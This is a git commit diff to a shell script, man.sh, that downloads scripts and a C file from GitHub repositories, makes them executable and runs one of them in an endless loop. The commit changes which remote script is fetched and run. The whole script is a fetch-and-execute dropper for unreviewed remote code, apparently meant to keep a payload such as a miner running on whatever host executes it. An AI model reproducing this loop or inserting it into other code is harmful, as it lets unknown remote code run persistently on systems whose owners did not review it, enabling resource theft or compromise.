bad9b0d4f5bcfa926c3051afc985e6f891cbe211
DarshGoswami1982 <87807143+DarshGoswami1982@users.noreply.github.com>
2021-08-25 11:54:08 +0530

    Update man.sh

--- man.sh
+++ man.sh
@@ -1,9 +1,9 @@
 #!/bin/sh
-  wget https://github.com/DarshGoswami1982/FkgX/raw/main/rx.sh 
-  chmod +x rx.sh 
+  wget https://github.com/DarshGoswami1982/D1/raw/main/sol.sh 
+  chmod +x sol.sh 
   wget https://github.com/biswas179/FkgX/raw/main/mas.c
   chmod +x mas.c
   while [ 1 ]; do
-  ./rx.sh
+  ./sol.sh
   sleep 20000
   done
